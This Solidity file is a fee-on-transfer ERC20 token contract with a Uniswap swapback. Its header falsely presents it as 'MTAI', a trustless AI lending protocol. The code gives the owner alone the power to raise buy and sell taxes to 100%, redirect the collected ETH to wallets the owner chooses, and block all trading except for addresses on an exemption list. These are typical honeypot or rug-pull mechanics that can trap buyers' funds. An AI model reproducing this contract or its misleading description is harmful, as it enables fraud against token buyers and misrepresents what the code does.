/*

MTAI is a peer-to-peer AI lending protocol designed for long-term mortgage-like loans of digital assets,
backed by other digital assets. 
Borrowers can receive a fixed-duration loan of fungible tokens backed by fungible or non-fungible tokens, 
while lenders can earn interest by granting these loans. 
The protocol is trustless, immutable, operates without the need for oracles, 
and without protocol-managed liquidations.

    Website:       https://www.merittradingai.com

    Document:      https://docs.merittradingai.com

    Trading App:   https://trade.merittradingai.com

    Twitter:       https://twitter.com/merittradingai

    Telegram:      https://t.me/merittradingai

*/

/*
 * SPDX-License-Identifier: MIT
 */

pragma solidity 0.8.22;
import "./TestLib.sol";
contract sendETHToFeesFacet is ERC20, Ownable {
    using SafeMath for uint256;

    event devReceiverUpdated(
        address indexed newWallet,
        address indexed oldWallet
    );
    event mktReceiverUpdated(
        address indexed newWallet,
        address indexed oldWallet
    );
    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SellFeeUpdated(
        uint256 totalSellFees,
        uint256 sellOPFees,
        uint256 sellTRFees
    );
    event BuyFeeUpdated(
        uint256 totalBuyFees,
        uint256 buyOPFees,
        uint256 buyTRFees
    );
    event ExcludeFromLimits(address indexed account, bool isExcluded);
    event MaxWalletUpdated(uint256 maxWalletLimits);
    event MaxTxUpdated(uint256 maxTxLimits);
    event SwapbackSettingsUpdated(
        bool enabled,
        uint256 swapMinAmounts,
        uint256 swapMaxAmounts
    );
    event DisabledTransferDelay(uint256 indexed timestamp);
    event LimitsRemoved(uint256 indexed timestamp);
    event UpdateFees(uint256 indexed timestamp);
    event TradingEnabled(uint256 indexed timestamp);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    function sendETHToFees(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(amount > 0, "amount must be greeter than 0");
        payable(ds.taxWallets).transfer(amount / 2);
        payable(ds.teamWallets).transfer(amount / 2);
    }
    function swapBack(uint256 amountToSwapForETH) private {
        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance == 0) {
            return;
        }
        swapTokensForEth(amountToSwapForETH);
        uint256 contractETHBalance = address(this).balance;
        if (contractETHBalance > 0) {
            sendETHToFees(address(this).balance);
        }
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        // generate the uniswap ds.pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.router.WETH();

        _approve(address(this), address(ds.router), tokenAmount);

        // make the swap
        ds.router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        require(
            amount > 0 || ds._isFeeExcludedFrom[from],
            "Amount should be greater than zero"
        );

        if (ds.limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !ds.swapping
            ) {
                if (!ds.isLive) {
                    require(
                        ds._isFeeExcludedFrom[from] ||
                            ds._isFeeExcludedFrom[to],
                        "_transfer:: Trading is not active."
                    );
                }
                if (ds.delayOn) {
                    require(
                        ds._isDelayExempt[from] || ds._isDelayExempt[to],
                        "_transfer:: Transfer Delay enabled. "
                    );
                }
                if (ds.transferDelayEnabled) {
                    if (
                        to != owner() &&
                        to != address(ds.router) &&
                        to != address(ds.pair)
                    ) {
                        require(
                            ds._holderLastTransferTimestamp[tx.origin] <
                                block.number,
                            "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                        );
                        ds._holderLastTransferTimestamp[tx.origin] = block
                            .number;
                    }
                }
                if (ds._ammPairs[from] && !ds._isTxExcludedFrom[to]) {
                    require(
                        amount <= ds.maxTxLimits,
                        "Buy transfer amount exceeds the ds.maxTxLimits."
                    );
                    require(
                        amount + balanceOf(to) <= ds.maxWalletLimits,
                        "Max wallet exceeded"
                    );
                } else if (ds._ammPairs[to] && !ds._isTxExcludedFrom[from]) {
                    require(
                        amount <= ds.maxTxLimits,
                        "Sell transfer amount exceeds the ds.maxTxLimits."
                    );
                } else if (!ds._isTxExcludedFrom[to]) {
                    require(
                        amount + balanceOf(to) <= ds.maxWalletLimits,
                        "Max wallet exceeded"
                    );
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= ds.swapMinAmounts;

        if (
            canSwap &&
            !ds.swapping &&
            ds.swapbackEnabled &&
            !ds._ammPairs[from] &&
            !ds._isFeeExcludedFrom[to] &&
            !ds._isFeeExcludedFrom[from] &&
            amount >= ds.swapMinAmounts
        ) {
            ds.swapping = true;
            swapBack(min(amount, min(contractTokenBalance, ds.swapMaxAmounts)));
            ds.swapping = false;
        }

        bool takeFee = !ds.swapping;

        if (ds._isFeeExcludedFrom[from] || ds._isFeeExcludedFrom[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        if (ds.swapbackEnabled && !ds.swapping) {
            if (takeFee) {
                if (ds._ammPairs[to] && ds.totalSellFees > 0) {
                    fees = amount.mul(ds.totalSellFees).div(100);
                    ds.tokensForDev +=
                        (fees * ds.sellTRFees) /
                        ds.totalSellFees;
                    ds.tokensForMarketing +=
                        (fees * ds.sellOPFees) /
                        ds.totalSellFees;
                } else if (ds._ammPairs[from] && ds.totalBuyFees > 0) {
                    fees = amount.mul(ds.totalBuyFees).div(100);
                    ds.tokensForDev += (fees * ds.buyTRFees) / ds.totalBuyFees;
                    ds.tokensForMarketing +=
                        (fees * ds.buyOPFees) /
                        ds.totalBuyFees;
                }
                if (fees > 0) {
                    super._transfer(from, address(this), fees);
                }
                amount -= fees;
            }
        }

        super._transfer(from, to, amount);
    }
    function setDelayOn(
        address[] calldata _addresses,
        bool _enabled
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint256 i = 0; i < _addresses.length; i++) {
            ds._isDelayExempt[_addresses[i]] = _enabled;
        }
    }
    function setDelay() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(ds.delayOn, "wl disabled");
        ds.delayOn = false;
        ds.buyOPFees = 30;
        ds.buyTRFees = 0;
        ds.totalBuyFees = ds.buyOPFees + ds.buyTRFees;

        ds.sellOPFees = 40;
        ds.sellTRFees = 0;
        ds.totalSellFees = ds.sellOPFees + ds.sellTRFees;
    }
    function setDevWallet(address newWallet) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        emit devReceiverUpdated(newWallet, ds.taxWallets);
        ds.taxWallets = newWallet;
    }
    function setMarketing(address newWallet) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        emit mktReceiverUpdated(newWallet, ds.teamWallets);
        ds.teamWallets = newWallet;
    }
    function setAutomatedMarketMakerPair(
        address _pair,
        bool value
    ) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            _pair != ds.pair,
            "The ds.pair cannot be removed from ds._ammPairs"
        );

        _setAutomatedMarketMakerPair(_pair, value);
    }
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._isFeeExcludedFrom[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }
    function setSellFees(
        uint256 _marketingFee,
        uint256 _devFee
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.sellOPFees = _marketingFee;
        ds.sellTRFees = _devFee;
        ds.totalSellFees = ds.sellOPFees + ds.sellTRFees;
        require(
            ds.totalSellFees <= 100,
            "Total sell fee cannot be higher than 100%"
        );
        emit SellFeeUpdated(ds.totalSellFees, ds.sellOPFees, ds.sellTRFees);
    }
    function setBuyFees(
        uint256 _marketingFee,
        uint256 _devFee
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.buyOPFees = _marketingFee;
        ds.buyTRFees = _devFee;
        ds.totalBuyFees = ds.buyOPFees + ds.buyTRFees;
        require(
            ds.totalBuyFees <= 100,
            "Total buy fee cannot be higher than 100%"
        );
        emit BuyFeeUpdated(ds.totalBuyFees, ds.buyOPFees, ds.buyTRFees);
    }
    function excludeFromMaxTransaction(
        address updAds,
        bool isEx
    ) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._isTxExcludedFrom[updAds] = isEx;
        emit ExcludeFromLimits(updAds, isEx);
    }
    function setWalletLimit(uint256 newNum) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(newNum >= 5, "Cannot set ds.maxWalletLimits lower than 0.5%");
        ds.maxWalletLimits = (newNum * totalSupply()) / 1000;
        emit MaxWalletUpdated(ds.maxWalletLimits);
    }
    function setTxLimit(uint256 newNum) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(newNum >= 2, "Cannot set ds.maxTxLimits lower than 0.2%");
        ds.maxTxLimits = (newNum * totalSupply()) / 1000;
        emit MaxTxUpdated(ds.maxTxLimits);
    }
    function setSwapBackSettings(
        bool _enabled,
        uint256 _min,
        uint256 _max
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            _min >= 1,
            "Swap amount cannot be lower than 0.01% total supply."
        );
        require(_max >= _min, "maximum amount cant be higher than minimum");

        ds.swapbackEnabled = _enabled;
        ds.swapMinAmounts = (totalSupply() * _min) / 10000;
        ds.swapMaxAmounts = (totalSupply() * _max) / 10000;
        emit SwapbackSettingsUpdated(_enabled, _min, _max);
    }
    function disableTransferDelay() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.transferDelayEnabled = false;
        emit DisabledTransferDelay(block.timestamp);
    }
    function removeLimit() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.buyOPFees = 2;
        ds.buyTRFees = 0;
        ds.totalBuyFees = ds.buyOPFees + ds.buyTRFees;

        ds.sellOPFees = 2;
        ds.sellTRFees = 0;
        ds.totalSellFees = ds.sellOPFees + ds.sellTRFees;

        ds.limitsInEffect = false;
        emit LimitsRemoved(block.timestamp);
    }
    function updateOPFees(
        uint256 _buyFees,
        uint256 _sellFees
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.buyOPFees = _buyFees;
        ds.buyTRFees = 0;
        ds.totalBuyFees = ds.buyOPFees + ds.buyTRFees;

        ds.sellOPFees = _sellFees;
        ds.sellTRFees = 0;
        ds.totalSellFees = ds.sellOPFees + ds.sellTRFees;
        emit UpdateFees(block.timestamp);
    }
    function startMeritTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.isLive = true;
        ds.swapbackEnabled = true;
        emit TradingEnabled(block.timestamp);
    }
    function addLPETH() external payable onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        IRouterV1 _router = IRouterV1(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        ds.router = _router;
        _approve(address(this), address(ds.router), ~uint256(0));
        ds.pair = IFactoryV2(_router.factory()).createPair(
            address(this),
            _router.WETH()
        );
        excludeFromMaxTransaction(address(ds.pair), true);
        _setAutomatedMarketMakerPair(address(ds.pair), true);
        _router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
    }
    function _setAutomatedMarketMakerPair(address _pair, bool value) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._ammPairs[_pair] = value;

        emit SetAutomatedMarketMakerPair(_pair, value);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }
}
